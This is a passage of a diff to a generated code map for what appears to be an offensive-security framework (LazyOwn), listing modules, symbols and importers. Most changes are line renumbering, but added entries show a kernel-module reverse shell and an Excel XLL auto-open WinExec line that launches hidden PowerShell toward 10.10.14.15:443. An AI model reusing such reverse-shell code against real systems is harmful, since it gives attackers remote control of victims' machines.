-- Imported by: `cli/commands/caldera.py`, `cli/commands/mcp_bridge.py`, `modules/operation.py`, `modules/planner.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+  - `PlaybookStep` (class, line 96) `class PlaybookStep`
+  - `Playbook` (class, line 128) `class Playbook`
+  - `StepResult` (class, line 160) `class StepResult`
+  - `PlaybookResult` (class, line 168) `class PlaybookResult`
+  - `_StixLoader` (class, line 179) `class _StixLoader`
+  - `_AtomicIndex` (class, line 246) `class _AtomicIndex`
+  - `_TechniqueSelector` (class, line 301) `class _TechniqueSelector`
+  - `PlaybookEngine` (class, line 362) `class PlaybookEngine`
+  - `get_engine` (method, line 648) `def get_engine(api_key)`
+  - `to_dict` (method, line 108) `def to_dict(self)`
+  - `from_dict` (method, line 123) `def from_dict(cls, d)`
+  - `to_dict` (method, line 136) `def to_dict(self)`
+  - `from_dict` (method, line 147) `def from_dict(cls, d)`
+  - `__init__` (method, line 182) `def __init__(self, json_path)`
+  - `available` (method, line 186) `def available(self)`
+  - `store` (method, line 189) `def store(self)`
+  - `techniques_for_tactics` (method, line 203) `def techniques_for_tactics(self, tactic_shortnames, platform)`
+  - `__init__` (method, line 252) `def __init__(self, atomics_path)`
+  - `available` (method, line 256) `def available(self)`
+  - `build` (method, line 259) `def build(self)`
+  - `tests_for_technique` (method, line 290) `def tests_for_technique(self, technique_id, platform)`
+  - `select` (method, line 307) `def select(self, candidates, world_context, target, phase, api_key, top_n)`
+  - `__init__` (method, line 374) `def __init__(self, world_model, obs_parser, api_key, top_n)`
+  - `_world_model` (method, line 391) `def _world_model(self)`
+  - `_obs_parser` (method, line 401) `def _obs_parser(self)`
+  - `derive` (method, line 412) `def derive(self, target, phase, platform, apt_name)`
+  - `execute` (method, line 508) `def execute(self, playbook, executor, dry_run)`
+  - `save` (method, line 573) `def save(self, playbook, path)`
+  - `load` (method, line 586) `def load(self, path)`
+  - `result_summary` (method, line 613) `def result_summary(self, result)`
+  - `_local_executor` (method, line 700) `def _local_executor(command, host)`
+- Depends on: `core/logging.py`, `core/safe_exec.py`, `modules/llm_client.py`, `modules/obs_parser.py`, `modules/world_model.py`
+- Imported by: `cli/commands/caldera.py`, `cli/commands/mcp_bridge.py`, `modules/operation.py`, `modules/planner.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/playbook_executor.py
 - Layer: utility
@@ -3685,7 +3753,7 @@
   - `analyse` (method, line 814) `def analyse(self, output, command, platform, context)`
   - `top_decision` (method, line 926) `def top_decision(self, output, command, platform, context)`
 - Depends on: `core/config.py`, `core/logging.py`, `modules/session_rag.py`
-- Imported by: `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_reactive_engine_semantic.py`, `mutants/tests/test_reactive_lateral_data.py`, `skills/autonomous_daemon.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/toposwarm_autonomous.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_reactive_engine_semantic.py`, `tests/test_reactive_lateral_data.py`
+- Imported by: `skills/autonomous_daemon.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/toposwarm_autonomous.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_reactive_engine_semantic.py`, `tests/test_reactive_lateral_data.py`
 
 ## modules/recommender.py
 - Layer: utility
@@ -3759,28 +3827,29 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `ScriptError` (class, line 74) `class ScriptError(RuntimeError)`
-  - `ScriptContext` (class, line 79) `class ScriptContext`
-  - `ResourceScriptEngine` (class, line 262) `class ResourceScriptEngine`
-  - `__init__` (method, line 86) `def __init__(self, shell_params, on_command, on_print)`
-  - `_resolve` (method, line 121) `def _resolve(self, text)`
-  - `print` (method, line 134) `def print(self, msg)`
-  - `run_command` (method, line 143) `def run_command(self, cmd)`
-  - `_skip` (method, line 159) `def _skip(self)`
-  - `_lookup` (method, line 162) `def _lookup(self, name)`
-  - `_resolve_operand` (method, line 177) `def _resolve_operand(self, operand)`
-  - `eval_condition` (method, line 185) `def eval_condition(self, raw_condition)`
-  - `_compare` (method, line 214) `def _compare(left, op, right)`
-  - `_jump_past` (method, line 245) `def _jump_past(self, open_res, close_re)`
-  - `__init__` (method, line 270) `def __init__(self, context)`
-  - `execute` (method, line 273) `def execute(self, script_path)`
-  - `execute_lines` (method, line 287) `def execute_lines(self, lines, source)`
-  - `execute_string` (method, line 325) `def execute_string(self, script)`
-  - `_extract_macros` (method, line 329) `def _extract_macros(self, lines)`
-  - `_execute_line` (method, line 345) `def _execute_line(self, raw)`
-  - `_call_macro` (method, line 535) `def _call_macro(self, name, args)`
-  - `_repl` (method, line 122) `def _repl(m)`
-- Imported by: `cli/commands/resource_scripting.py`, `mutants/tests/test_resource_script.py`, `mutants/tests/test_security_hardening_v3.py`, `tests/test_resource_script.py`, `tests/test_security_hardening_v3.py`
+  - `ScriptError` (class, line 76) `class ScriptError(RuntimeError)`
+  - `ScriptContext` (class, line 81) `class ScriptContext`
+  - `ResourceScriptEngine` (class, line 266) `class ResourceScriptEngine`
+  - `__init__` (method, line 88) `def __init__(self, shell_params, on_command, on_print)`
+  - `_resolve` (method, line 123) `def _resolve(self, text)`
+  - `print` (method, line 136) `def print(self, msg)`
+  - `run_command` (method, line 145) `def run_command(self, cmd)`
+  - `_skip` (method, line 163) `def _skip(self)`
+  - `_lookup` (method, line 166) `def _lookup(self, name)`
+  - `_resolve_operand` (method, line 181) `def _resolve_operand(self, operand)`
+  - `eval_condition` (method, line 189) `def eval_condition(self, raw_condition)`
+  - `_compare` (method, line 218) `def _compare(left, op, right)`
+  - `_jump_past` (method, line 249) `def _jump_past(self, open_res, close_re)`
+  - `__init__` (method, line 274) `def __init__(self, context)`
+  - `execute` (method, line 277) `def execute(self, script_path)`
+  - `execute_lines` (method, line 291) `def execute_lines(self, lines, source)`
+  - `execute_string` (method, line 329) `def execute_string(self, script)`
+  - `_extract_macros` (method, line 333) `def _extract_macros(self, lines)`
+  - `_execute_line` (method, line 349) `def _execute_line(self, raw)`
+  - `_call_macro` (method, line 539) `def _call_macro(self, name, args)`
+  - `_repl` (method, line 124) `def _repl(m)`
+- Depends on: `core/safe_exec.py`
+- Imported by: `cli/commands/resource_scripting.py`, `tests/test_resource_script.py`, `tests/test_security_hardening_v3.py`
 
 ## modules/reverse-shell.c
 - Layer: utility
@@ -3789,6 +3858,9 @@
 - Symbols:
   - `reverse_shell_init` (function, line 12) `static int __init reverse_shell_init(void)`
   - `reverse_shell_exit` (function, line 15) `static void __exit reverse_shell_exit(void)`
+  - `call_usermodehelper` (function, line 13) `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
+  - `printk` (function, line 17) `printk(KERN_INFO "Exiting\n");`
+  - `module_init` (function, line 19) `module_init(reverse_shell_init);`
 
 ## modules/revshell.c
 - Layer: utility
@@ -3797,6 +3869,8 @@
 - Symbols:
   - `xlAutoOpen` (function, line 4) `void __cdecl xlAutoOpen()`
   - `DllMain` (function, line 9) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
+  - `__declspec` (function, line 2) `__declspec(dllexport) void __cdecl xlAutoOpen(void);`
+  - `WinExec` (function, line 7) `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 443);`
 
 ## modules/rich_tui.py
 - Layer: presentation
@@ -3855,7 +3929,7 @@
   - `epsilon` (method, line 400) `def epsilon(self)`
   - `_penalize` (method, line 405) `def _penalize(self, reward, detection_prob)`
 - Depends on: `core/logging.py`
-- Imported by: `modules/lesson_ingestor.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `skills/autonomous_daemon.py`, `skills/swan_agent.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`
+- Imported by: `modules/lesson_ingestor.py`, `skills/autonomous_daemon.py`, `skills/swan_agent.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`
 
 ## modules/saas_attacks.py
 - Layer: utility
@@ -3912,7 +3986,7 @@
   - `__init__` (method, line 418) `def __init__(self, config)`
   - `sanitize` (method, line 429) `def sanitize(self, value)`
   - `_sanitize` (method, line 433) `def _sanitize(self, value, depth)`
-- Imported by: `lazyc2.py`, `lazyc2/blueprints/phishing.py`, `modules/lazyown_bprfuzzer.py`, `mutants/tests/test_security_sanitizers.py`, `pwntomate.py`, `tests/test_security_sanitizers.py`
+- Imported by: `lazyc2.py`, `lazyc2/blueprints/phishing.py`, `modules/lazyown_bprfuzzer.py`, `pwntomate.py`, `tests/test_security_sanitizers.py`
 
 ## modules/session_rag.py
 - Layer: utility
@@ -3943,7 +4017,7 @@
   - `context_for_step` (method, line 482) `def context_for_step(self, phase, target, cmd, n)`
   - `stats` (method, line 502) `def stats(self)`
 - Depends on: `core/logging.py`
-- Imported by: `cli/commands/mcp_bridge.py`, `modules/reactive_engine.py`, `modules/reactive_engine.py`, `mutants/tests/integration_autonomous_flow.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `cli/commands/mcp_bridge.py`, `modules/reactive_engine.py`, `modules/reactive_engine.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/session_reader.py
 - Layer: utility
@@ -3978,7 +4052,7 @@
   - `update_status` (method, line 264) `def update_status(self, task_id, status)`
   - `__init__` (method, line 295) `def __init__(self, implant_reader, output_reader, host_reader, task_reader)`
   - `aggregate` (method, line 307) `def aggregate(self, sessions_dir)`
-- Imported by: `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/session_state.py
 - Layer: utility
@@ -4028,7 +4102,7 @@
   - `to_dict` (method, line 519) `def to_dict(self)`
   - `from_dict` (method, line 528) `def from_dict(cls, raw)`
 - Depends on: `cli/commands/enum.py`, `core/logging.py`
-- Imported by: `cli/commands/sleep_obfuscation.py`, `cli/commands/sleep_obfuscation.py`, `cli/commands/sleep_obfuscation.py`, `modules/beacon_config_builder.py`, `mutants/tests/test_sleep_obfuscation.py`, `tests/test_sleep_obfuscation.py`
+- Imported by: `cli/commands/sleep_obfuscation.py`, `cli/commands/sleep_obfuscation.py`, `cli/commands/sleep_obfuscation.py`, `modules/beacon_config_builder.py`, `tests/test_sleep_obfuscation.py`
 
 ## modules/smbver.sh
 - Layer: utility
@@ -4071,7 +4145,7 @@
   - `from_dict` (method, line 528) `def from_dict(cls, raw)`
   - `from_payload` (method, line 534) `def from_payload(cls, payload)`
 - Depends on: `cli/commands/enum.py`, `core/logging.py`
-- Imported by: `cli/commands/socks_proxy.py`, `cli/commands/socks_proxy.py`, `cli/commands/socks_proxy.py`, `modules/beacon_config_builder.py`, `mutants/tests/test_socks_proxy.py`, `tests/test_socks_proxy.py`
+- Imported by: `cli/commands/socks_proxy.py`, `cli/commands/socks_proxy.py`, `cli/commands/socks_proxy.py`, `modules/beacon_config_builder.py`, `tests/test_socks_proxy.py`
 
 ## modules/staged_delivery.py
 - Layer: utility
@@ -4198,7 +4272,7 @@
   - `_save` (method, line 563) `def _save(self, model)`
   - `_add` (method, line 435) `def _add(ioc)`
 - Depends on: `core/logging.py`
-- Imported by: `cli/commands/mcp_bridge.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `cli/commands/mcp_bridge.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/timeline_narrator.py
 - Layer: utility
@@ -4362,7 +4436,7 @@
   - `render_unified` (method, line 167) `def render_unified(self)`
   - `export_json` (method, line 248) `def export_json(self)`
 - Depends on: `cli/graph_advisor.py`, `core/logging.py`, `modules/dashboard_engine.py`, `modules/exploit_recommender.py`, `modules/live_surface.py`, `modules/world_model.py`, `skills/hive_mind.py`, `skills/lazyown_policy.py`
-- Imported by: `mutants/tests/test_unified_dashboard.py`, `skills/lazyown_mcp.py`, `tests/test_unified_dashboard.py`
+- Imported by: `skills/lazyown_mcp.py`, `tests/test_unified_dashboard.py`
 
 ## modules/update_db.sh
 - Layer: utility
@@ -4412,31 +4486,31 @@
 - Layer: presentation
 - Language: py
 - Symbols:
-  - `configure_logging` (function, line 33) `def configure_logging(debug)`
-  - `LazyOwnShellWrapper` (class, line 37) `class LazyOwnShellWrapper`
-  - `VulnBotCLI` (class, line 131) `class VulnBotCLI`
-  - `parse_args` (method, line 295) `def parse_args()`
-  - `interactive_mode` (method, line 307) `def interactive_mode(bot)`
-  - `main` (method, line 328) `def main()`
-  - `__init__` (method, line 40) `def __init__(self, script_path)`
-  - `_load_shell_with_deps` (method, line 46) `def _load_shell_with_deps(self)`
-  - `execute_command` (method, line 82) `def execute_command(self, command)`
-  - `get_available_commands` (method, line 120) `def get_available_commands(self)`
-  - `__init__` (method, line 132) `def __init__(self, provider, mode, debug, script_path)`
-  - `_load_model` (method, line 146) `def _load_model(self)`
-  - `_setup_agent` (method, line 165) `def _setup_agent(self)`
-  - `_register_pentesting_tools` (method, line 189) `def _register_pentesting_tools(self)`
-  - `_register_fallback_tools` (method, line 217) `def _register_fallback_tools(self)`
-  - `read_file_content` (method, line 223) `def read_file_content(self, file_path)`
-  - `load_knowledge_base` (method, line 233) `def load_knowledge_base(self)`
-  - `save_knowledge_base` (method, line 239) `def save_knowledge_base(self, kb)`
-  - `get_relevant_knowledge` (method, line 243) `def get_relevant_knowledge(self, prompt)`
-  - `add_to_knowledge_base` (method, line 248) `def add_to_knowledge_base(self, prompt, response)`
-  - `process_with_context` (method, line 254) `def process_with_context(self, file_path, event)`
-  - `_stream_response` (method, line 289) `def _stream_response(self, prompt)`
-  - `run_cli_command` (method, line 198) `def run_cli_command(command)`
-  - `read_file` (method, line 218) `def read_file(path)`
-  - `generate` (method, line 290) `def generate()`
+  - `configure_logging` (function, line 35) `def configure_logging(debug)`
+  - `LazyOwnShellWrapper` (class, line 39) `class LazyOwnShellWrapper`
+  - `VulnBotCLI` (class, line 121) `class VulnBotCLI`
+  - `parse_args` (method, line 285) `def parse_args()`
+  - `interactive_mode` (method, line 297) `def interactive_mode(bot)`
+  - `main` (method, line 318) `def main()`
+  - `__init__` (method, line 42) `def __init__(self, script_path)`
+  - `_load_shell_with_deps` (method, line 48) `def _load_shell_with_deps(self)`
+  - `execute_command` (method, line 84) `def execute_command(self, command)`
+  - `get_available_commands` (method, line 110) `def get_available_commands(self)`
+  - `__init__` (method, line 122) `def __init__(self, provider, mode, debug, script_path)`
+  - `_load_model` (method, line 136) `def _load_model(self)`
+  - `_setup_agent` (method, line 155) `def _setup_agent(self)`
+  - `_register_pentesting_tools` (method, line 179) `def _register_pentesting_tools(self)`
+  - `_register_fallback_tools` (method, line 207) `def _register_fallback_tools(self)`
+  - `read_file_content` (method, line 213) `def read_file_content(self, file_path)`
+  - `load_knowledge_base` (method, line 223) `def load_knowledge_base(self)`
+  - `save_knowledge_base` (method, line 229) `def save_knowledge_base(self, kb)`
+  - `get_relevant_knowledge` (method, line 233) `def get_relevant_knowledge(self, prompt)`
+  - `add_to_knowledge_base` (method, line 238) `def add_to_knowledge_base(self, prompt, response)`
+  - `process_with_context` (method, line 244) `def process_with_context(self, file_path, event)`
+  - `_stream_response` (method, line 279) `def _stream_response(self, prompt)`
+  - `run_cli_command` (method, line 188) `def run_cli_command(command)`
+  - `read_file` (method, line 208) `def read_file(path)`
+  - `generate` (method, line 280) `def generate()`
 - Depends on: `core/logging.py`, `modules/agent_runner.py`, `modules/agent_tool.py`, `modules/ai_model.py`, `modules/llm_factory.py`, `modules/logging_config.py`
 
 ## modules/vuln_bot_cli.py
@@ -4481,27 +4555,27 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `WebSocketBeacon` (class, line 43) `class WebSocketBeacon`
-  - `WebSocketC2Handler` (class, line 253) `class WebSocketC2Handler`
-  - `__init__` (method, line 59) `def __init__(self, server_url, beacon_id, encryption_key, sleep_seconds, jitter_percent, ssl_verify, proxy)`
-  - `_encrypt` (method, line 88) `def _encrypt(self, data)`
-  - `_decrypt` (method, line 94) `def _decrypt(self, data)`
-  - `_build_message` (method, line 100) `def _build_message(self, msg_type, payload)`
-  - `_jittered_sleep` (method, line 111) `def _jittered_sleep(self)`
-  - `connect` (method, line 118) `def connect(self)`
-  - `check_in` (method, line 148) `def check_in(self)`
-  - `send_result` (method, line 177) `def send_result(self, task_id, output, exit_code)`
-  - `run` (method, line 195) `def run(self, command_handler)`
-  - `shutdown` (method, line 242) `def shutdown(self)`
-  - `__init__` (method, line 267) `def __init__(self, host, port, ssl_context, beacon_callback, task_callback, result_callback)`
-  - `_handle_connection` (method, line 289) `def _handle_connection(self, websocket, path)`
-  - `start` (method, line 353) `def start(self)`
-  - `stop` (method, line 363) `def stop(self)`
-  - `start_in_thread` (method, line 370) `def start_in_thread(self)`
-  - `_run_loop` (method, line 381) `def _run_loop(self, loop)`
-  - `send_task` (method, line 387) `def send_task(self, beacon_id, command)`
-  - `list_beacons` (method, line 416) `def list_beacons(self)`
-  - `remove_stale_beacons` (method, line 433) `def remove_stale_beacons(self, timeout)`
+  - `WebSocketBeacon` (class, line 46) `class WebSocketBeacon`
+  - `WebSocketC2Handler` (class, line 274) `class WebSocketC2Handler`
+  - `__init__` (method, line 62) `def __init__(self, server_url, beacon_id, encryption_key, sleep_seconds, jitter_percent, ssl_verify, proxy)`
+  - `_encrypt` (method, line 91) `def _encrypt(self, data)`
+  - `_decrypt` (method, line 97) `def _decrypt(self, data)`
+  - `_build_message` (method, line 103) `def _build_message(self, msg_type, payload)`
+  - `_jittered_sleep` (method, line 114) `def _jittered_sleep(self)`
+  - `connect` (method, line 122) `def connect(self)`
+  - `check_in` (method, line 157) `def check_in(self)`
+  - `send_result` (method, line 191) `def send_result(self, task_id, output, exit_code)`
+  - `run` (method, line 214) `def run(self, command_handler)`
+  - `shutdown` (method, line 263) `def shutdown(self)`
+  - `__init__` (method, line 288) `def __init__(self, host, port, ssl_context, beacon_callback, task_callback, result_callback)`
+  - `_handle_connection` (method, line 310) `def _handle_connection(self, websocket, path)`
+  - `start` (method, line 382) `def start(self)`
+  - `stop` (method, line 392) `def stop(self)`
+  - `start_in_thread` (method, line 399) `def start_in_thread(self)`
+  - `_run_loop` (method, line 410) `def _run_loop(self, loop)`
+  - `send_task` (method, line 416) `def send_task(self, beacon_id, command)`
+  - `list_beacons` (method, line 447) `def list_beacons(self)`
+  - `remove_stale_beacons` (method, line 464) `def remove_stale_beacons(self, timeout)`
 - Depends on: `core/hardening.py`
 
 ## modules/wineconfig.sh
@@ -4574,7 +4648,7 @@
   - `reset` (method, line 1058) `def reset(self)`
   - `snapshot` (method, line 1069) `def snapshot(self)`
 - Depends on: `cli/commands/enum.py`, `core/logging.py`
-- Imported by: `cli/commands/exploit_migrated.py`, `cli/commands/mcp_bridge.py`, `cli/commands/misc_migrated.py`, `cli/commands/pwn.py`, `cli/ops_commands.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `modules/exploit_recommender.py`, `modules/integrations/nuclei_parser.py`, `modules/intelligence_engine.py`, `modules/intelligence_engine.py`, `modules/killchain.py`, `modules/killchain.py`, `modules/killchain.py`, `modules/live_surface.py`, `modules/live_surface.py`, `modules/operation.py`, `modules/planner.py`, `modules/playbook_engine.py`, `modules/state_manager.py`, `modules/unified_dashboard.py`, `mutants/tests/integration_autonomous_flow.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_killchain_snapshot.py`, `mutants/tests/test_killchain_snapshot.py`, `mutants/tests/test_killchain_snapshot.py`, `mutants/tests/test_killchain_unified.py`, `mutants/tests/test_killchain_unified.py`, `mutants/tests/test_killchain_unified.py`, `mutants/tests/test_killchain_unified.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_killchain_unified_v2.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_ops_loot_phase.py`, `mutants/tests/test_ops_loot_phase.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_world_model_extended.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/conftest.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_ops_loot_phase.py`, `tests/test_ops_loot_phase.py`, `tests/test_phase1_data_gaps.py`, `tests/test_world_model_extended.py`
+- Imported by: `cli/commands/exploit_migrated.py`, `cli/commands/mcp_bridge.py`, `cli/commands/misc_migrated.py`, `cli/commands/pwn.py`, `cli/ops_commands.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `modules/exploit_recommender.py`, `modules/integrations/nuclei_parser.py`, `modules/intelligence_engine.py`, `modules/intelligence_engine.py`, `modules/killchain.py`, `modules/killchain.py`, `modules/killchain.py`, `modules/live_surface.py`, `modules/live_surface.py`, `modules/operation.py`, `modules/planner.py`, `modules/playbook_engine.py`, `modules/state_manager.py`, `modules/unified_dashboard.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/conftest.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_killchain_unified_v2.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, 